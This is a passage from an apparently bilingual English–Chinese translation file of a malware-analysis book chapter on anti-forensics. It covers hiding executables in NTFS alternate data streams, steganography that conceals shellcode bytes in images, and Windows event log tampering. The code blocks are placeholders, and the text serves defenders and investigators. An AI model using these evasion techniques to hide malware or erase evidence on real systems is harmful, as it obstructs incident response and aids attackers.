    和类似函数来将其加密密钥在内存中清零，以减少密钥恢复的可能性。
- en: Instead of completely erasing memory, an attacker could alter it to remove or
    change code or data that would give away the malware’s presence. For example,
    the malware could simply remove the PE magic bytes <samp class="SANS_TheSansMonoCd_W5Regular_11">MZ</samp>
    from a memory region, causing some investigation tools that rely on this signature
    to fail. Or it could hide parts of its code or configuration in memory, such as
    by encoding or encrypting strings like command and control addresses. We’ll discuss
    code and data obfuscation and encryption in [Chapter 16](chapter16.xhtml), but
    many of the techniques that apply there could also be used as anti-forensics measures.
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以通过修改内存来移除或更改代码或数据，从而隐藏恶意软件的存在，而不是完全擦除内存。例如，恶意软件可以简单地从内存区域中移除 PE 魔法字节 <samp
    class="SANS_TheSansMonoCd_W5Regular_11">MZ</samp>，使得一些依赖于该签名的调查工具失效。或者，它还可以将其代码或配置的部分内容隐藏在内存中，例如通过编码或加密命令和控制地址等字符串。我们将在[第16章](chapter16.xhtml)中讨论代码和数据混淆与加密，但许多适用于该章节的技术也可以作为反取证措施。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Abusing Alternate Data Streams</samp>
  id: totrans-176
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">滥用替代数据流</samp>
- en: Another approach to hiding files is using NTFS Alternate Data Streams (ADS).
    Data contained in files in the Microsoft NTFS filesystem is usually located in
    a *primary data stream*. If you open a text file in a text editor, for example,
    the data displayed is part of the primary data stream. But data can also be hidden
    inside an ADS, in which case it won’t be readily apparent when an investigator
    inspects a file.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 隐藏文件的另一种方法是使用 NTFS 替代数据流（ADS）。在 Microsoft NTFS 文件系统中，文件中包含的数据通常位于*主数据流*中。例如，如果你在文本编辑器中打开一个文本文件，显示的数据就是主数据流的一部分。但数据也可以隐藏在
    ADS 中，在这种情况下，当调查人员检查文件时，数据并不容易显现。
- en: 'The best way to illustrate NTFS ADS is with an example. You can try this out
    yourself. First, create a text file with some dummy text and save the file as
    *file.txt*. To hide data in this file, run the following command:'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 说明 NTFS ADS 最好的方式是通过一个示例。你可以自己尝试一下。首先，创建一个包含虚拟文本的文本文件，并将文件保存为 *file.txt*。要在该文件中隐藏数据，请运行以下命令：
- en: '[PRE23]'
  id: totrans-179
  prefs: []
  type: TYPE_PRE
  zh: '[PRE23]'
- en: 'This command saves the text <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden
    text</samp> in the NTFS ADS <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp>.
    After running this command, if you open *file.txt* in a text editor, you won’t
    see the hidden text. To prove that the hidden text still exists, run the following
    command to print the primary data contained in the text file:'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令将文本 <samp class="SANS_TheSansMonoCd_W5Regular_11">hidden text</samp> 保存在
    NTFS ADS <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp> 中。运行此命令后，如果你在文本编辑器中打开
    *file.txt*，你将看不到隐藏的文本。为了证明隐藏文本依然存在，运行以下命令打印出文本文件中包含的主数据：
- en: '[PRE24]'
  id: totrans-181
  prefs: []
  type: TYPE_PRE
  zh: '[PRE24]'
- en: 'Then, print out the text in the <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp>
    ADS like so:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 然后，像这样打印出 <samp class="SANS_TheSansMonoCd_W5Regular_11">supersecret</samp> ADS
    中的文本：
- en: '[PRE25]'
  id: totrans-183
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'The output for the second command should be the data contained in the ADS.
    More practically, malware can hide code or a file, such as an executable, inside
    an ADS in a similar fashion. For example, the following command writes the malicious
    executable *evil.exe* to the file *invoice.doc* inside the data stream <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp>:'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 第二个命令的输出应该是 ADS 中包含的数据。更实际地说，恶意软件可以通过类似的方式将代码或文件（如可执行文件）隐藏在 ADS 中。例如，以下命令将恶意可执行文件
    *evil.exe* 写入文件 *invoice.doc* 的数据流 <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp>
    中：
- en: '[PRE26]'
  id: totrans-185
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: Using this command, I wrote an executable file of about 760KB to the file *invoice.doc*,
    as shown in [Figure 15-6](chapter15.xhtml#fig15-6).
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 使用这个命令，我将一个约 760KB 的可执行文件写入了文件*invoice.doc*，如[图 15-6](chapter15.xhtml#fig15-6)所示。
- en: '![](../images/fig15-6.jpg)'
  id: totrans-187
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-6.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-6: Hiding an executable
    file in an ADS</samp>'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-6：将可执行文件隐藏在 ADS 中</samp>
- en: Viewing the document file’s metadata reveals that the file size is 12KB (the
    primary data stream) but with a “size on disk” value of 776KB (the total size
    of the file after I copied the executable file into its ADS).
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: 查看文档文件的元数据，显示文件大小为 12KB（主数据流），但“磁盘上的大小”值为 776KB（在我将可执行文件复制到其 ADS 后文件的总大小）。
- en: Viewing this file in a hex editor or PE viewer reveals no anomalies. Data stored
    in the <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp> data stream will
    be invisible to most file editors and investigation tools unless an investigator
    knows exactly what to look for. Streams (from the sysinternals suite) is a good
    tool for identifying ADS anomalies.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 在十六进制编辑器或 PE 查看器中查看此文件时，没有发现异常。存储在 <samp class="SANS_TheSansMonoCd_W5Regular_11">evil</samp>
    数据流中的数据对于大多数文件编辑器和调查工具来说是不可见的，除非调查人员知道该查找的内容。Streams（来自 sysinternals 套件）是一个很好的工具，用于识别
    ADS 异常。
- en: Using an NTFS ADS is only one mechanism for hiding malicious files and code
    from investigation. Another tactic is hiding code in the CLFS log subsystem, as
    shown by researchers at Mandiant (see the article “Too Log; Didn’t Read—Unknown
    Actor Using CLFS Log Files for Stealth” by Adrien Bataille and Blaine Stancill,
    at [*https://<wbr>www<wbr>.mandiant<wbr>.com<wbr>/resources<wbr>/blog<wbr>/unknown<wbr>-actor<wbr>-using<wbr>-clfs<wbr>-log<wbr>-files<wbr>-for<wbr>-stealth*](https://www.mandiant.com/resources/blog/unknown-actor-using-clfs-log-files-for-stealth)).
    These techniques can effectively hide evidence from scrutinizing users and can
    add time and effort to the incident response and forensics investigation processes,
    both of which are boons to malware authors.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 使用NTFS ADS仅仅是隐藏恶意文件和代码以避免调查的一个机制。另一种策略是将代码隐藏在CLFS日志子系统中，正如Mandiant的研究人员所展示的那样（参见Adrien
    Bataille和Blaine Stancill的文章《Too Log; Didn’t Read—Unknown Actor Using CLFS Log
    Files for Stealth》，链接：[*https://<wbr>www<wbr>.mandiant<wbr>.com<wbr>/resources<wbr>/blog<wbr>/unknown<wbr>-actor<wbr>-using<wbr>-clfs<wbr>-log<wbr>-files<wbr>-for<wbr>-stealth*](https://www.mandiant.com/resources/blog/unknown-actor-using-clfs-log-files-for-stealth)）。这些技术可以有效地隐藏证据，避免细致的用户检查，并增加事件响应和取证调查的时间与难度，这对于恶意软件作者来说是非常有利的。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Hiding Data with Steganography</samp>
  id: totrans-192
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">使用隐写术隐藏数据</samp>
- en: '*Steganography* is a technique for hiding data in ordinary file formats, such
    as image, video, and audio files. Modern evasive malware might use steganography
    to circumvent endpoint and network defenses, as it effectively hides or obfuscates
    malicious code within seemingly innocent files, but this technique also fits quite
    nicely into the category of anti-forensics.'
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: '*隐写术*是一种将数据隐藏在普通文件格式中的技术，例如图像、视频和音频文件。现代的回避性恶意软件可能会使用隐写术来绕过端点和网络防御，因为它能有效地将恶意代码隐藏或混淆在看似无害的文件中，但这一技术也非常符合反取证的范畴。'
- en: Early examples of malware that used steganography techniques include the Duqu
    malware family from 2011, which gathered information from victim systems and stored
    it in a JPEG image file, and the Zeus banking trojan from 2014, which hid C2 commands
    in images that it sent to victims. A more recent example is an attack discovered
    by ESET researchers and dubbed “Stegano,” which featured exploit code embedded
    in images on various websites. The malicious code may have gone undetected by
    network defenses due to the way it was hidden in the image data (see Daniel Goodin’s
    article “Millions Exposed to Malvertising That Hid Attack Code in Banner Pixels”
    at [*https://<wbr>arstechnica<wbr>.com<wbr>/information<wbr>-technology<wbr>/2016<wbr>/12<wbr>/millions<wbr>-exposed<wbr>-to<wbr>-malvertising<wbr>-that<wbr>-hid<wbr>-attack<wbr>-code<wbr>-in<wbr>-banner<wbr>-pixels<wbr>/*](https://arstechnica.com/information-technology/2016/12/millions-exposed-to-malvertising-that-hid-attack-code-in-banner-pixels/)).
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: 使用隐写术技术的早期恶意软件示例包括2011年的Duqu恶意软件家族，它从受害系统收集信息并将其存储在JPEG图像文件中，以及2014年的Zeus银行木马，它将C2命令隐藏在发送给受害者的图像中。一个较新的例子是ESET研究人员发现的攻击，名为“Stegano”，其在多个网站的图像中嵌入了利用代码。由于代码隐藏在图像数据中，网络防御可能未能发现恶意代码（参见Daniel
    Goodin的文章《数百万用户暴露于恶意广告，其中隐藏了攻击代码》：[*https://<wbr>arstechnica<wbr>.com<wbr>/information<wbr>-technology<wbr>/2016<wbr>/12<wbr>/millions<wbr>-exposed<wbr>-to<wbr>-malvertising<wbr>-that<wbr>-hid<wbr>-attack<wbr>-code<wbr>-in<wbr>-banner<wbr>-pixels<wbr>/*](https://arstechnica.com/information-technology/2016/12/millions-exposed-to-malvertising-that-hid-attack-code-in-banner-pixels/))。
- en: Malware can leverage steganography for many reasons, such as to hide data and
    malicious code from investigators, to obfuscate C2 commands in transit, or to
    mask data that will be exfiltrated from the victim network. There are a few different
    ways in which it can do this, including file appending and bit manipulation. *File
    appending*, as its name implies, is simply adding one file to the end of another,
    in a sort of piggybacking manner. As an example, if I were investigating a JPEG
    file that I suspected has been tampered with, I might inspect the headers of the
    file in a hex editor (see [Figure 15-7](chapter15.xhtml#fig15-7)).
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件可能出于多种原因利用隐写术，比如隐藏数据和恶意代码以避免调查，混淆传输中的C2命令，或者掩盖将从受害者网络中泄露的数据。有几种方式可以做到这一点，包括文件附加和位操作。*文件附加*，顾名思义，就是将一个文件附加到另一个文件的末尾，类似于搭便车的方式。例如，如果我正在调查一个我怀疑已被篡改的JPEG文件，我可能会在十六进制编辑器中检查该文件的头部（参见[图
    15-7](chapter15.xhtml#fig15-7)）。
- en: '![](../images/fig15-7.jpg)'
  id: totrans-196
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-7.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-7: A JPEG file header</samp>'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-7：JPEG文件头</samp>
- en: This header is standard for a JPEG (which is <samp class="SANS_TheSansMonoCd_W5Regular_11">JFIF</samp>
    in the figure) file type. Further analysis of the file data reveals the anomaly
    shown in [Figure 15-8](chapter15.xhtml#fig15-8).
  id: totrans-198
  prefs: []
  type: TYPE_NORMAL
  zh: 此文件头是JPEG文件类型的标准头（图中为 <samp class="SANS_TheSansMonoCd_W5Regular_11">JFIF</samp>）。进一步分析文件数据揭示了[图
    15-8](chapter15.xhtml#fig15-8) 中所示的异常。
- en: '![](../images/fig15-8.jpg)'
  id: totrans-199
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-8.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-8: A file header
    hidden inside the JPEG file</samp>'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-8：隐藏在JPEG文件中的文件头</samp>
- en: Notice the <samp class="SANS_TheSansMonoCd_W5Regular_11">PK</samp> in this figure.
    This is the standard header for a ZIP archive file, indicating that a ZIP file
    may have been appended to the JPEG image! To extract this file and examine its
    contents, we could take a few approaches. First, we could “carve” the embedded
    ZIP out of this image file using a hex editor. This involves simply copying the
    suspect data from the file and dumping it to a new file. An alternative and simpler
    approach is using the free Binwalk utility ([*https://<wbr>github<wbr>.com<wbr>/ReFirmLabs<wbr>/binwalk*](https://github.com/ReFirmLabs/binwalk)).
    Binwalk “walks” an input file, searching for signs of other embedded files, and
    can automatically carve out these files. [Figure 15-9](chapter15.xhtml#fig15-9)
    shows Binwalk being used to extract a hidden executable file (*surprise.exe*)
    from a ZIP container embedded in the JPEG image.
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 注意此图中的 <samp class="SANS_TheSansMonoCd_W5Regular_11">PK</samp>。这是ZIP归档文件的标准头，表明一个ZIP文件可能已经被附加到JPEG图像中！为了提取此文件并检查其内容，我们可以采取几种方法。首先，我们可以使用十六进制编辑器从此图像文件中“雕刻”出嵌入的ZIP文件。这只涉及从文件中复制可疑数据，并将其转储到一个新文件中。另一种更简单的方法是使用免费的Binwalk工具（[*https://<wbr>github<wbr>.com<wbr>/ReFirmLabs<wbr>/binwalk*](https://github.com/ReFirmLabs/binwalk)）。Binwalk会“遍历”输入文件，搜索其他嵌入文件的迹象，并能自动提取这些文件。[图
    15-9](chapter15.xhtml#fig15-9)展示了使用Binwalk从JPEG图像中嵌入的ZIP容器中提取隐藏的可执行文件（*surprise.exe*）。
- en: '![](../images/fig15-9.jpg)'
  id: totrans-202
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-9.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-9: Carving out embedded
    files with Binwalk</samp>'
  id: totrans-203
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-9：使用Binwalk提取嵌入文件</samp>
- en: <samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp>
  id: totrans-204
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: <samp class="SANS_Dogma_OT_Bold_B_15">注意</samp>
- en: '*You can find this malware sample in MalShare or VirusTotal with the following
    hash:*'
  id: totrans-205
  prefs: []
  type: TYPE_NORMAL
  zh: '*你可以在MalShare或VirusTotal上通过以下哈希值找到此恶意软件样本：*'
- en: 'SHA256: 0cfcf571748f0d0c3bcedead2508f0bec329558c29017e7093a138853cc0e17e'
  id: totrans-206
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'SHA256: 0cfcf571748f0d0c3bcedead2508f0bec329558c29017e7093a138853cc0e17e'
- en: This is a rather simple example of steganography. Modern attacks, however, generally
    use more complex techniques, such as *bit manipulation*, or rearranging or modifying
    bits to evade detection. For example, the individual bits in an image file could
    be manipulated to covertly store malicious code without affecting the quality
    of the image. [Figure 15-10](chapter15.xhtml#fig15-10) shows an excerpt of the
    data from an unaltered image file, viewed in a hex editor.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个相对简单的隐写术示例。然而，现代攻击通常使用更复杂的技术，如 *位操作*，通过重新排列或修改位来规避检测。例如，图像文件中的单独位可以被操作，用以隐蔽地存储恶意代码，而不影响图像的质量。[图
    15-10](chapter15.xhtml#fig15-10) 展示了在十六进制编辑器中查看的未修改图像文件的数据摘录。
- en: '![](../images/fig15-10.jpg)'
  id: totrans-208
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-10.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-10: A hex dump of
    the unaltered image</samp>'
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-10：未修改图像的十六进制转储</samp>
- en: However, this image has now been deviously manipulated by a threat actor, as
    you can see in [Figure 15-11](chapter15.xhtml#fig15-11).
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，如图 [图 15-11](chapter15.xhtml#fig15-11) 所示，该图像已经被威胁行为者巧妙地修改。
- en: '![](../images/fig15-11.jpg)'
  id: totrans-211
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-11.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-11: A hex dump of
    the altered image</samp>'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图 15-11：已修改图像的十六进制转储</samp>
- en: 'The last (16th) byte of each row has been manipulated. If a malware sample
    were to load this image file for reading (using <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadFile</samp>,
    for example), it could specifically extract these suspect bytes from the image
    file, as the following pseudocode does:'
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 每行的最后（第16个）字节已被修改。如果恶意软件样本加载该图像文件进行读取（例如，使用 <samp class="SANS_TheSansMonoCd_W5Regular_11">ReadFile</samp>），它可以特别提取图像文件中的这些可疑字节，正如以下伪代码所示：
- en: '[PRE27]'
  id: totrans-214
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: 'Once all bytes are stored in memory, they add up to the byte string <samp class="SANS_TheSansMonoCd_W5Regular_11">"89
    E9 8D 55 05 FF D0"</samp>. Converting this byte string to x86 code reveals the
    following assembly code, which is likely to be some sort of shellcode:'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦所有字节被存储在内存中，它们将组成字节串 <samp class="SANS_TheSansMonoCd_W5Regular_11">"89 E9
    8D 55 05 FF D0"</samp>。将这个字节串转换为x86代码会显示出以下汇编代码，这可能是某种shellcode：
- en: '[PRE28]'
  id: totrans-216
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'Finally, the *least significant bit (LSB)* technique involves tampering with
    specific bits inside a file. To illustrate this steganography technique, let’s
    say an image file has the following set of 8 bytes, each representing a pixel
    in the image:'
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，*最低有效位（LSB）* 技术涉及篡改文件中的特定位。为了说明这种隐写技术，假设一个图像文件包含以下8个字节，每个字节代表图像中的一个像素：
- en: '[PRE29]'
  id: totrans-218
  prefs: []
  type: TYPE_PRE
  zh: '[PRE29]'
- en: 'In some image-encoding formats, such as bitmap (BMP), the LSB, or the last
    bit in each byte, can be modified without greatly affecting the image. So, if
    an attacker wanted to hide malicious code inside this image, they could tamper
    with the LSBs and form a new string of bits. Let’s imagine that an attacker modified
    a select few of the LSBs (shown in bold):'
  id: totrans-219
  prefs: []
  type: TYPE_NORMAL
  zh: 在某些图像编码格式中，如位图（BMP），最低有效位（LSB），即每个字节中的最后一位，可以在不显著影响图像的情况下进行修改。因此，如果攻击者想要在图像中隐藏恶意代码，他们可以篡改最低有效位并形成一个新的比特串。假设攻击者修改了几个特定的最低有效位（以粗体显示）：
- en: '[PRE30]'
  id: totrans-220
  prefs: []
  type: TYPE_PRE
  zh: '[PRE30]'
- en: 'If we combine all the LSBs into a new byte, we get this:'
  id: totrans-221
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们将所有的最低有效位（LSBs）合并成一个新的字节，就会得到如下结果：
- en: '[PRE31]'
  id: totrans-222
  prefs: []
  type: TYPE_PRE
  zh: '[PRE31]'
- en: This byte in and of itself doesn’t mean much to us. However, if the attacker
    were able to modify large amounts of LSBs in an image, they could effectively
    hide malicious code or data inside this image. Malware could hold pieces of its
    malicious code or configuration inside an image, using the LSBs as temporary storage.
  id: totrans-223
  prefs: []
  type: TYPE_NORMAL
  zh: 这个字节本身对我们并没有太大意义。然而，如果攻击者能够修改图像中的大量最低有效位（LSBs），他们就可以有效地在图像中隐藏恶意代码或数据。恶意软件可以将其恶意代码或配置的片段存储在图像内，利用最低有效位作为临时存储。
- en: As a final note, there are many open source and publicly available toolkits,
    such as Steghide ([*https://<wbr>steghide<wbr>.sourceforge<wbr>.net<wbr>/documentation<wbr>.php*](https://steghide.sourceforge.net/documentation.php)),
    for easy implementation of steganography techniques. It’s worth looking into these
    tools to better understand how steganography works and how it can be abused by
    malware authors to hide malicious code and data.
  id: totrans-224
  prefs: []
  type: TYPE_NORMAL
  zh: 最后值得注意的是，许多开源和公开可用的工具包，如Steghide（[*https://<wbr>steghide<wbr>.sourceforge<wbr>.net<wbr>/documentation<wbr>.php*](https://steghide.sourceforge.net/documentation.php)），可以轻松实现隐写技术。值得深入了解这些工具，以更好地理解隐写术的工作原理以及恶意软件作者如何利用它隐藏恶意代码和数据。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">Tampering with Logs
    and Evidence</samp>
  id: totrans-225
  prefs:
  - PREF_H4
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">篡改日志和证据</samp>
- en: 'During an investigation, logs and other metadata can serve as valuable evidence
    that a specific malicious event did or did not occur, so altering or removing
    them will hamper the detection, response, and analysis process. For this reason,
    logs and related metadata can be prime targets for evasive malware that seeks
    to hide its activities from investigators. In this section, we’ll look at two
    tampering techniques: log tampering and timestomping.'
  id: totrans-226
  prefs: []
  type: TYPE_NORMAL
  zh: 在调查过程中，日志和其他元数据可以作为有价值的证据，证明特定的恶意事件是否发生过，因此篡改或删除它们将妨碍检测、响应和分析过程。因此，日志及相关元数据可能成为逃避性恶意软件的主要目标，恶意软件试图隐藏其活动，以避免被调查人员发现。在本节中，我们将介绍两种篡改技术：日志篡改和时间戳篡改。
- en: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows Event Log Tampering</samp>
  id: totrans-227
  prefs:
  - PREF_H5
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Bold_Condensed_B_11">Windows事件日志篡改</samp>
- en: '*Log tampering* involves altering or deleting entries from logs on the host
    that may give away the malware’s presence. One type of log source that an attacker
    might tamper with is *Windows event logs*, which contain information about various
    Windows and application events and are thus great sources of data for investigators.
    [Figure 15-12](chapter15.xhtml#fig15-12) shows the Windows Event Viewer, a built-in
    Windows utility for exploring event logs.'
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: '*日志篡改* 涉及修改或删除主机上的日志条目，这些条目可能暴露恶意软件的存在。攻击者可能篡改的一种日志来源是 *Windows事件日志*，它包含有关各种Windows和应用程序事件的信息，因此是调查人员的宝贵数据来源。[图15-12](chapter15.xhtml#fig15-12)显示了Windows事件查看器，这是一个内置的Windows工具，用于浏览事件日志。'
- en: '![](../images/fig15-12.jpg)'
  id: totrans-229
  prefs: []
  type: TYPE_IMG
  zh: '![](../images/fig15-12.jpg)'
- en: '<samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-12: Viewing system
    event logs in the Windows Event Viewer</samp>'
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Book_Oblique_I_11">图15-12：在Windows事件查看器中查看系统事件日志</samp>
- en: 'Windows event logs have a common structure that includes the following information:'
  id: totrans-231
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 事件日志具有包含以下信息的共同结构：
- en: An *event ID* denoting the type of event that occurred
  id: totrans-232
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一个 *事件 ID*，表示发生的事件类型
- en: A *timestamp* indicating the date and time of that event
  id: totrans-233
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 一个表示事件日期和时间的 *时间戳*
- en: The *source* of the event, such as the specific software or component that triggered
    it
  id: totrans-234
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 事件的 *来源*，例如触发该事件的具体软件或组件
- en: A *description* of the event
  id: totrans-235
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 事件的 *描述*
- en: 'Additionally, each event has a level assigned to it:'
  id: totrans-236
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，每个事件都被分配一个级别：
- en: '*Informational*, for general messages such as information about a software
    package being installed or uninstalled'
  id: totrans-237
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*信息*，用于传达一般信息，如安装或卸载软件包的相关信息'
- en: '*Warnings*, for events that could indicate an issue that should be addressed'
  id: totrans-238
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*警告*，用于指示可能表明应当解决的问题的事件'
- en: '*Errors*, for events such as application crashes'
  id: totrans-239
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*错误*，用于表示应用程序崩溃等事件'
- en: '*Critical*, for events that are detrimental to the functioning of the system'
  id: totrans-240
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '*严重*，用于表示对系统功能有害的事件'
- en: Windows can capture many different event types. Three of the most common log
    types are *system* logs (for events related to the system and its components),
    *application* logs (for events related to Windows and third-party applications
    and services), and *security* logs (for events related to security, such as authentication).
    Naturally, there are some event types that security analysts and investigators
    should pay special attention to, as they can offer clues about how a system was
    compromised or what actions malware took on the system. [Table 15-3](chapter15.xhtml#tab15-3)
    lists a small subset of these events.
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 可以捕捉多种不同的事件类型。三种最常见的日志类型是 *系统* 日志（记录与系统及其组件相关的事件）、*应用程序* 日志（记录与 Windows
    和第三方应用程序及服务相关的事件）和 *安全* 日志（记录与安全相关的事件，如身份验证）。显然，安全分析师和调查人员应特别关注某些事件类型，因为它们可能提供有关系统如何被攻击或恶意软件在系统上采取了哪些行动的线索。[表
    15-3](chapter15.xhtml#tab15-3)列出了这些事件中的一小部分。
- en: <samp class="SANS_Futura_Std_Heavy_B_11">Table 15-3:</samp> <samp class="SANS_Futura_Std_Book_11">Event
    Types of Interest to Security Analysts and Investigators</samp>
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: <samp class="SANS_Futura_Std_Heavy_B_11">表 15-3：</samp> <samp class="SANS_Futura_Std_Book_11">安全分析师和调查人员关心的事件类型</samp>
- en: '| <samp class="SANS_Futura_Std_Heavy_B_11">Windows event ID</samp> | <samp
    class="SANS_Futura_Std_Heavy_B_11">Description</samp> |'
  id: totrans-243
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Heavy_B_11">Windows 事件 ID</samp> | <samp class="SANS_Futura_Std_Heavy_B_11">描述</samp>
    |'
- en: '| --- | --- |'
  id: totrans-244
  prefs: []
  type: TYPE_TB
  zh: '| --- | --- |'
- en: '| <samp class="SANS_Futura_Std_Book_11">4624</samp> | <samp class="SANS_Futura_Std_Book_11">An
    account successfully authenticated (logged in to) Windows. The log records important
    information such as the account’s username and source IP address.</samp> |'
  id: totrans-245
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4624</samp> | <samp class="SANS_Futura_Std_Book_11">账户成功地进行了身份验证（登录）到
    Windows。日志记录了重要信息，如账户的用户名和源 IP 地址。</samp> |'
- en: '| <samp class="SANS_Futura_Std_Book_11">4625</samp> | <samp class="SANS_Futura_Std_Book_11">There
    was a failed login attempt.</samp> |'
  id: totrans-246
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4625</samp> | <samp class="SANS_Futura_Std_Book_11">发生了失败的登录尝试。</samp>
    |'
- en: '| <samp class="SANS_Futura_Std_Book_11">4688</samp> | <samp class="SANS_Futura_Std_Book_11">A
    process was started. The log records details such as the process’s name and which
    account initiated the process.</samp> |'
  id: totrans-247
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4688</samp> | <samp class="SANS_Futura_Std_Book_11">启动了一个进程。日志记录了诸如进程名称以及哪个账户启动了该进程等详细信息。</samp>
    |'
- en: '| <samp class="SANS_Futura_Std_Book_11">4689</samp> | <samp class="SANS_Futura_Std_Book_11">A
    process was terminated.</samp> |'
  id: totrans-248
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4689</samp> | <samp class="SANS_Futura_Std_Book_11">终止了一个进程。</samp>
    |'
- en: '| <samp class="SANS_Futura_Std_Book_11">4698</samp> | <samp class="SANS_Futura_Std_Book_11">A
    scheduled task was created.</samp> |'
  id: totrans-249
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4698</samp> | <samp class="SANS_Futura_Std_Book_11">创建了一个计划任务。</samp>
    |'
- en: '| <samp class="SANS_Futura_Std_Book_11">4703</samp> | <samp class="SANS_Futura_Std_Book_11">Token
    privileges were enabled or disabled for an account. Investigators can use this
    to potentially identify privilege elevation and impersonation attempts.</samp>
    |'
  id: totrans-250
  prefs: []
  type: TYPE_TB
  zh: '| <samp class="SANS_Futura_Std_Book_11">4703</samp> | <samp class="SANS_Futura_Std_Book_11">为账户启用或禁用了令牌权限。调查人员可以利用此信息来识别潜在的特权提升和冒充尝试。</samp>
    |'
